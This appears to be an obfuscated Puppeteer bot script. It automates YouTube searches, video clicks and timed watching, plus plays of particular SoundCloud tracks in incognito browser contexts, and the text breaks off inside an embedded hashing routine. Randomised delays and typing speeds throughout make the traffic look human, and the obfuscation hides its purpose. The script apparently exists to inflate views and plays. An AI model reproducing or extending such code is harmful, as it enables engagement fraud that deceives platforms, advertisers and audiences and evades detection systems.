const Y = d,
  X = c,
  W = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x729 * -0x2 + 0x6be + -0x150f))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x5 * -0x7c5 + 0x1fe3 * 0x1 + 0x6f6), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x12 * -0x1bd + -0x4 * -0x705 + 0x22 * -0x1bf);
    let h = e[f];
    if (c['TpRbbP'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1205 + -0xb24 + -0x6e1, r, s, t = 0x1ee7 + 0xdea * -0x1 + 0x1 * -0x10fd; s = m['charAt'](t++); ~s && (r = q % (0xc8e + -0x239e + 0x1714) ? r * (0x1fe3 * 0x1 + -0x3 * -0x3a0 + 0x2a83 * -0x1) + s : s, q++ % (0xa58 + 0x1 * -0x19fa + 0x1 * 0xfa6)) ? o += String['fromCharCode'](0x1b3a + 0x9 * -0x239 + -0x2 * 0x31d & r >> (-(-0x1 * 0x9bc + 0x3 * 0xc44 + -0x2 * 0xd87) * q & 0x1af2 + -0x225f + 0x1 * 0x773)) : -0x1d7d * -0x1 + -0x1d68 + -0x15) {
          s = n['indexOf'](s);
        }
        for (let u = -0x7 * -0x4d + 0x1901 + -0x1b1c, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x220a + 0x13ab + -0xe6f * -0x1))['slice'](-(-0x24a1 * -0x1 + -0xf8 * 0x1c + -0x97f));
        }
        return decodeURIComponent(p);
      };
      c['uJpUjI'] = i, b = arguments, c['TpRbbP'] = !![];
    }
    const j = e[0x1237 + -0x1 * 0x20ff + 0xec8],
      k = f + j,
      l = b[k];
    return !l ? (h = c['uJpUjI'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x260 * -0x2b + 0xe875 + 0x1 * -0xd965 + (-0xfb3 * -0x7 + 0x7f8 + 0x1 * -0x3b45) * random()) : await standardWaitForNetIdle(f), await wait(0x1901 + 0xd * -0xc2 + 0x461 + (-0x6 * -0xca4 + -0x1c7 * -0x4 + -0x2be4) * random()), 0x472 * -0x1 + 0x2279 + -0xf03 * 0x2;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xb47 * -0x3 + -0x1 * 0x6fb + 0x3c58), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1 * 0x86d + -0x220a + -0xe28 * -0x3;
}
async function randomWait() {
  return await wait(-0x24a1 * -0x1 + -0xf8 * 0x1c + 0xa07 + (0x1237 + -0x1 * 0x20ff + 0x2250) * random()), -0xab6 + 0x2 * 0x3ab + 0x5 * 0xad;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x6ea + 0x1331 + -0xa3 * 0x29, -0x103 * 0x18 + 0xb7 * 0x29 + -0x500), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x5993 * -0x5 + -0xdd3c * 0x2 + 0x464b7) * getRandomInt(-0x203d + -0xb7f + 0x2bbe, -0x143f + 0x2631 + 0x11ed * -0x1), h)), 0x1 * -0x8c6 + -0x887 * -0x2 + -0x847;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1df * -0x5 + 0x1 * 0x16ed + -0xd92;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x4d3 + 0x2441 + 0x5 * -0x837]['split']('\x20');
    for (let k = 0x1cee + -0xbd8 + -0x1116; k < i['length']; k += -0x23e3 * -0x1 + 0xd8e + -0x316f)
      j += i[k] * h[i[k + (-0xb02 + -0x39e + 0xea1)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = d,
      R = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => R(0x8) + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2104 * -0x1 + -0xcd0 + -0x142e)['map'](l => Array['from'](l['children']))['flat'](0x746 * -0x3 + -0x232 * -0xd + -0x6b7)['map'](l => l[S(0x0)][0x53 * 0x17 + -0x1 * 0xd61 + -0x5ed * -0x1]['childNodes'][0x24f3 * -0x1 + -0x2112 + -0xef * -0x4b]['childNodes'][-0x2dc * 0x7 + -0x76f + 0xdba * 0x2]['childNodes'][-0x42e + -0x1beb + 0x2019]['childNodes'][-0x5 * 0x52 + -0x153d * 0x1 + 0x16d8]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1 * -0x2144 + 0x710 + -0x94 * 0x3f, 0xa72 * -0x1 + -0x21e0 + 0x3fda)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x48c4 + -0x1 * -0x1983 + 0x69d9);
  const h = await getMaxTime(f),
    i = Math['min']((-0x8e42 + 0x7388 + 0x1051a) * getRandomInt(-0x1 * -0x1889 + 0x23b8 + -0x3c3f, -0x385 + 0x25e6 + -0x225c), h);
  return await wait(i), -0xe * -0x1a3 + 0x4b6 + -0x1b9f;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0xb4e + -0x760 + -0x1f7 * 0x2]['children'][0xf17 + 0x1a40 + -0x2957]['children'][-0x2 * 0x9b3 + 0x3b * -0x71 + -0x2d71 * -0x1]['children'][0xd3 * 0x1a + -0xd * 0x146 + -0x4e0]['children'][0x1 * -0x1364 + 0x516 + 0xe4e]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x99 * -0x33 + -0xc * -0x48 + -0x21da;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1d26 + -0x84c + 0x6d2 * -0x3 + (0x121 * -0x22 + 0x20a1 * 0x1 + 0x1 * 0x5f3) * random()
  }), await wait(-0x58a + 0x1d6d + -0x463 * 0x5 + (0x1267 + -0x1993 + 0x1 * 0x858) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x4 * 0x977 + -0x926 + -0x1cb4]['childNodes'][-0x19f + 0x137a + -0x5 * 0x392]['childNodes'][0x215 * -0xc + 0x21f * 0x1 + -0x2 * -0xb6f]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1429 + -0x1d3e + 0x316c]['childNodes'][-0x6e0 + -0x68c + 0xd6c * 0x1]['childNodes'][0x24b4 + -0x2530 + 0x7e]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        const T = d;
        let q = p[T(0x1b)](',\x20')['map'](u => u['split']('\x20'))['flat'](0x7d * 0x25 + 0x17c9 * -0x1 + 0x125 * 0x5),
          r = -0x1339 + -0x261e + -0x7 * -0x831;
        for (let u = -0x617 + -0x1 * 0x5 + 0x1 * 0x61c; u < q['length']; u += 0x24c8 + 0x2 * 0x665 + 0x632 * -0x8)
          r += q[u] * k[q[u + (0x10f4 * 0x1 + -0xe6f + -0x284)]];
        return r;
      }(n);
  });
  await wait((-0x23d * 0x25 + -0x4ca * 0x8 + 0xb3b9) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x26f * 0x2 + -0xb2a2 + 0x1a1e0) * getRandomInt(-0x2180 + 0xfe5 + -0x31 * -0x5c, 0x3 * 0x92f + -0x203f + 0x4bc), h + (0x12f3 + 0xe * -0x1d0 + 0x19f5));
  return await wait(i), 0x1356 + -0xcc6 + 0x17 * -0x49;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1922 + 0x11 * -0x8d + 0x227f * 0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1 * 0x406 + 0xc5c + 0x362 + (0x14f3 * -0x1 + -0x1367 + 0x2 * 0x1621) * Math['random']());
    });
  }, -0x264f + 0x227c + 0x1f2b);
  await wait(0x71164 + 0x6c3 + -0x28447);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x15d1b + -0x3078 + 0x277f3 * 0x1) * getRandomInt(0x1907 + -0x5d3 + -0x1330, 0x208f + 0xacb + -0xe6b * 0x3)), clearInterval(h), -0x59f * -0x3 + -0xd1c + -0x3c0;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x115 * 0x1f + 0x1ba2 + -0x3d2d;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x2507 * 0x1 + 0xe6d + -0x1 * -0x169b;
    await randomWait();
  }
  return -0x2 * 0x523 + 0x9b * -0x38 + -0x2c2f * -0x1;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x12 * -0x1bd + -0x4 * -0x705 + 0x22 * -0x1bf);
    let h = e[f];
    return h;
  }, d(b, c);
}

function fetchRandomSC() {
  return Math['random']() <= -0x182f + 0x7f1 + 0x21 * 0x7e + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xe73 * 0x1 + -0x1f81 + 0xad * 0x44 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x2 * 0x19b + -0x108 + 0x43e + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x838 + -0x2641 + 0x1e09 * 0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1e25 * -0x5 + 0x1 * -0x14fb2 + 0x168c1 * 0x1 + getRandomInt(-0x2eb8 + -0xc68 + -0x75b8 * -0x1, 0x89d8 + -0x83 * -0x7a + -0x5316));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x92 * -0xb + -0x179d + 0x1de4), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1774 + -0x2 * 0x8af + -0x616;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + U(0x17) + 'ment.inner' + 'HTML');
      return log(v['slice'](0x2301 + 0x1f * -0x103 + -0x3a4, 0xdb7 + 0x2 * 0x335 + -0x13ef)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x5e8 + 0x1a2d * -0x1 + 0x27e5 + floor((-0x26 * -0x5 + -0x634 * -0x1 + -0x30a) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x2d095c96 + 0x168029f0 + 0x968932a6),
          -0xc7f7b0 + -0xf190a7 + 0x2398857,
          0x1 * -0x1333 + 0xd43e + -0x410b * 0x1,
          -0x1d8f + 0x1 * -0x268a + 0x4499
        ], y = [
          -0x20f0 + -0xac8 + 0x2bd0,
          0x1b6e + -0x1 * 0xa9f + -0x10bf,
          -0x611 * 0x5 + 0x20 * 0x64 + 0x11 * 0x10d,
          -0x13b8 + -0x49b + -0x1df * -0xd
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x236 + 0x1ebc * -0x1 + 0x20f3)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1b4b + -0x14 * 0x1a5 + 0x1 * 0x599; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x2100 + -0x2 * -0xe8e + -0x3e1c) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x55 * 0x71 + 0x5 * -0x19e + 0x2d9b] = A[0x2 * 0x450 + 0x35 * -0x71 + -0x1 * -0xed5] = A[0x11db + 0xf11 + -0x20eb] = A[0x1 * -0x959 + 0x9 * 0x260 + -0xc05] = A[0x7b0 + -0x3 * 0x619 + -0xa9e * -0x1] = A[-0x1 * -0x1c6c + 0xc2d + -0x1 * 0x2895] = A[-0x178d + -0x4b1 * -0x8 + -0x2 * 0x6fb] = A[-0x2159 * 0x1 + 0xd * -0x22d + 0x3da8] = A[0x1409 + 0x35 * 0x1 + -0xcf * 0x19] = A[0x2065 * 0x1 + -0x1 * 0x23f9 + 0xc * 0x4d] = A[-0x6db + -0x1b * 0x67 + 0x11c1] = A[0x1 * -0x21ee + -0x10c * -0x4 + 0x1dc8] = A[-0xff + -0x1494 + 0x159e * 0x1] = A[-0x23 * -0x19 + 0x1cd4 + 0x1 * -0x2033] = A[-0xb2 * 0xd + -0x1b1f + 0x2436] = A[-0x1fd * 0xa + 0x1 * 0x1f75 + -0x3d7 * 0x3] = A[-0x1a7d + -0x21da + -0x1422 * -0x3] = -0x2 * -0x860 + 0x80b + -0x1 * 0x18cb, this['blocks'] = A) : this['blocks'] = [
                -0x1 * 0x10be + 0x6 * -0x1f3 + 0x1c70,
                -0x8c1 + 0x71b * -0x5 + 0x2c48,
                0x3b4 * 0x2 + 0x11bc + -0x4 * 0x649,
                0x462 + -0x8 * 0x43a + -0x1 * -0x1d6e,
                -0x2697 + 0x1 * 0xf8d + -0x3 * -0x7ae,
                0x43 * 0x59 + -0x1b2 * 0x1 + -0x1599,
                -0xc6f + 0xc69 * -0x1 + 0x18d8,
                0x1be1 + -0x134c + -0xa9 * 0xd,
                -0x1bd5 + -0x4b3 * 0x3 + -0x29ee * -0x1,
                0x2709 + 0x28e + 0xa9 * -0x3f,
                0x3 * 0x342 + -0x1116 + 0x9 * 0xd0,
                0x1226 + -0x1c09 + 0x9e3 * 0x1,
                0x1 * -0x1f05 + -0x1e5f + 0x3d64,
                0x253f + 0x103 * 0x25 + 0x9e * -0x79,
                0x1fda + 0x2603 + -0x5 * 0xdf9,
                0x266f * -0x1 + 0x16af + 0x24 * 0x70,
                0x1edd + -0xa * 0xf + 0x17 * -0x151
              ], this['h0'] = -0x36f73dfe + -0x40cd * -0x326c2 + -0x2dfa285b, this['h1'] = -0x13ddb7fc7 + 0x943f7b * 0x33 + 0x1614ad * 0x17eb, this['h2'] = 0xbcac7c1d + 0x13 * 0xe1bd527 + -0x130027104, this['h3'] = 0x5ef4c3 * -0x51 + -0x94 * 0x66196 + -0x886f3 * -0x5db, this['h4'] = 0x46 * 0x263769b + -0x38dc9d45 * -0x3 + -0x8df56441, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x5a0 + -0x1787 + 0x11e7, this['finalized'] = this['hashed'] = -0x1 * 0x60d + -0xf * 0x16a + 0x1 * 0x1b43, this['first'] = -0x19c5 + 0xdc0 + 0x26 * 0x51;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1d80 + 0x3 * 0xc1d + 0x6d7 * -0x1, O = J['length'] || -0x17e * 0x13 + -0x4 * -0x8ca + 0x1 * -0x6ce, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1 * 0x81 + -0xa19 + 0x2 * 0x54d, P[-0x1 * 0x14d5 + -0x1248 + -0x24d * -0x11] = this['block'], P[0x1 * -0x89 + -0x25 * 0x5 + 0x152] = P[-0x2f * -0xcb + -0x1bf * 0x5 + -0x1c89] = P[0x1253 + 0x1f * -0x10b + 0x5c * 0x27] = P[-0x102c + -0x890 + 0x18bf] = P[-0x727 + -0xd52 + 0x1 * 0x147d] = P[0x1 * -0x23de + 0x1150 + -0x631 * -0x3] = P[-0x1085 + -0x241 * 0x7 + -0x1 * -0x2052] = P[-0x1 * -0x1af + 0x3 * -0x54e + -0x1 * -0xe42] = P[-0xa * 0x251 + 0x5fa + -0x3a * -0x4c] = P[-0x6 * 0x3a4 + -0x13 * -0x92 + 0xb * 0x101] = P[0xe * 0x16f + 0x1 * 0x19d3 + 0x5b * -0x81] = P[-0xcfe + -0x6d0 + 0x13d9] = P[0x1 * -0x22b2 + -0xc9d + 0x2f5b] = P[-0xdf1 + -0xdf * 0x17 + 0x2207] = P[-0x101c * 0x2 + -0x1c1c + 0x3c62] = P[-0x6 * 0xf9 + 0x1364 + -0x1 * 0xd7f] = 0x14fb + 0x58e * -0x4 + 0x13d), K) {
                    for (N = this['start']; M < O && N < 0x1 * 0xf7f + -0x15 * 0x174 + 0xf45; ++M)
                      P[N >> -0x220f * -0x1 + -0x120b + -0x1002] |= J[M] << y[0x1629 + 0x19ae + 0x4 * -0xbf5 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x3ab + -0x2 * -0x11f9 + -0x275d; ++M)
                      (L = J['charCodeAt'](M)) < 0x25e8 + -0x1a24 + 0x19c * -0x7 ? P[N >> -0x1673 * -0x1 + 0x1 * -0x1df5 + -0x784 * -0x1] |= L << y[0x218a + -0x1a * 0x131 + -0x28d & N++] : L < -0xef * -0x7 + 0xc * -0x1ac + 0x1587 ? (P[N >> -0x8 * -0x1fb + 0x4b3 + -0x1 * 0x1489] |= (0x20 * 0x45 + -0xd2b * 0x1 + 0x54b | L >> 0x1f46 + 0x3 * -0x705 + -0x1 * 0xa31) << y[0x2d * -0x99 + 0x85 * -0x20 + 0x2b88 & N++], P[N >> -0x23fa + 0x1df4 + 0x182 * 0x4] |= (0x1 * -0x2356 + -0x10c4 + 0x349a | -0x52 * 0x33 + -0x1 * 0x2119 + -0x31ae * -0x1 & L) << y[-0x2 * 0x12aa + -0xe * 0x116 + 0x348b & N++]) : L < 0x131b8 + 0x2cd4 + -0x868c * 0x1 || L >= 0x1 * 0xca8d + -0xdb56 + -0xf0c9 * -0x1 ? (P[N >> 0xf9b + -0x19 * 0xc + -0xe6d] |= (-0x1 * -0x21d1 + -0x7 * -0x54f + -0x461a | L >> 0x385 * 0x9 + 0x11e3 + -0x3184 * 0x1) << y[-0xf0b * 0x1 + -0x1 * 0x2509 + 0xa6b * 0x5 & N++], P[N >> -0x1 * -0x175 + 0x175 * 0x1 + 0xba * -0x4] |= (-0x3 * -0x9fb + 0x5a2 + 0x29 * -0xdb | L >> -0x1571 + -0x12c8 + 0x283f * 0x1 & 0x458 + 0x1721 + -0x2 * 0xd9d) << y[-0x11 * 0x1a + 0x1b2 + -0x1 * -0xb & N++], P[N >> -0x191 * 0x15 + -0x1313 + 0x33fa * 0x1] |= (0xe47 + 0x2093 + -0x2e5a | -0xc83 + 0x54 * -0x70 + 0x3182 & L) << y[0x63 * 0xd + -0x2510 + 0x7 * 0x494 & N++]) : (L = -0xe4ad + -0xf939 + 0x1 * 0x2dde6 + ((-0xba1 * 0x3 + -0x64 + 0x2746 & L) << -0x1f19 + -0x1a60 + -0x1 * -0x3983 | -0xd * 0xff + -0x1e0c + 0x2efe & J['charCodeAt'](++M)), P[N >> -0x1d31 + -0x86 * -0x29 + 0x7bd * 0x1] |= (-0x7 * 0x2b3 + -0xe2 * -0x25 + -0xcd5 | L >> 0x42d * -0x9 + -0x2 * 0xa72 + 0x3a8b) << y[0x1a7c + -0xa * -0x5b + -0x1 * 0x1e07 & N++], P[N >> 0xe * 0xa4 + -0x16de + -0x6f4 * -0x2] |= (0x1 * 0x25a3 + 0x1d5e + 0x5 * -0xd4d | L >> -0x2be + 0x17 * 0xaa + -0xc7c & -0x1e5 * -0xb + 0x18e * -0x13 + -0x1 * -0x8f2) << y[-0x170a + -0x869 + -0x1f76 * -0x1 & N++], P[N >> -0x9 * 0x433 + 0x2303 + 0x2ca] |= (-0x8f * 0x21 + -0x14f * 0xf + -0x4 * -0x9a4 | L >> -0x2403 + -0x4d5 * -0x5 + -0xbe * -0x10 & -0x1 * -0x250 + 0x4 * -0x224 + -0x67f * -0x1) << y[0x6fb + -0x52c * 0x4 + -0x2 * -0x6dc & N++], P[N >> -0x8d4 + 0x5b4 + 0x322] |= (-0x20c * 0x4 + -0x47f * -0x4 + -0x94c | -0xad9 * -0x2 + 0x1c6b + -0x31de & L) << y[-0x17 * -0x2e + -0x209d + 0x1c7e & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x64c + 0x863 + -0x1d7 ? (this['block'] = P[0x3ef + 0x1a7a * -0x1 + -0x169b * -0x1], this['start'] = N - (0x2 * -0xd77 + 0x110b + -0x3 * -0x361), this['hash'](), this['hashed'] = -0x2386 + 0x7 * -0x1b6 + 0x2f81) : this['start'] = N;
                }
                return this['bytes'] > 0xecdf2f8f + 0x14aab87 * 0x15d + -0x1afab069b && (this['hBytes'] += this['bytes'] / (0x10b6951e0 + -0xe1582e2 * 0x20 + 0x1b7470a60) << 0x2052 + -0xf3 + -0x1f5f, this['bytes'] = this['bytes'] % (-0x1233c22d4 + -0x3a6bd5dd * -0x8 + 0x4fdd73ec)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1eb6 + 0x1aa1 + 0x20b * 0x2;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x11c4 * 0x2 + -0x41 + -0x2337 * 0x1] = this['block'], J[K >> 0x2281 + -0x13d1 + 0xeae * -0x1] |= x[-0x713 * -0x3 + -0x7 * -0x527 + 0x1f * -0x1d9 & K], this['block'] = J[-0x1d7c + 0x38d + 0x19ff], K >= 0x1ceb * 0x1 + 0x103 * 0x1c + -0x3907 && (this['hashed'] || this['hash'](), J[-0x2 * 0x7b5 + 0x1725 + -0x7bb] = this['block'], J[-0x14a9 + -0x39a * 0x6 + 0x2a55] = J[0x2e4 * 0xc + 0x196d + -0x3c1c] = J[-0x19 * 0x3 + -0x1e9d + 0x1eea] = J[0x2387 + 0x6e3 * -0x1 + -0x1ca1] = J[0x10ab + 0x10f5 + 0x3bc * -0x9] = J[-0x25c6 + -0x107b + 0x3646] = J[0x22a7 * 0x1 + 0x20a6 * -0x1 + -0xa9 * 0x3] = J[-0x27a * 0x5 + -0x13 * 0x70 + 0x14b9] = J[-0x1e8a + -0x1a89 * 0x1 + -0x21 * -0x1bb] = J[-0x1fca + 0x1 * 0x1bb3 + 0x420] = J[-0x69 * -0xa + -0x524 + 0x5c * 0x3] = J[-0x3 * -0xb71 + 0x3d * 0x24 + -0xd3 * 0x34] = J[-0x3 * -0x883 + 0x1 * 0x1055 + -0x29d2] = J[0x196d + 0x2 * 0x8c9 + -0x2af2] = J[0x51 * -0x49 + -0x9 * -0x81 + -0x1 * -0x129e] = J[-0x9d * 0x22 + 0x9 * -0x2b7 + 0x2d58] = 0x1371 + -0x6 * 0x1d3 + -0x87f), J[-0x450 * -0x8 + 0x848 + 0xe3e * -0x3] = this['hBytes'] << 0xbd + 0x26f1 + -0xf * 0x2a5 | this['bytes'] >>> 0x1af2 + -0x1ca0 + 0x1cb * 0x1, J[0xa41 + 0x2 * 0x12d9 + 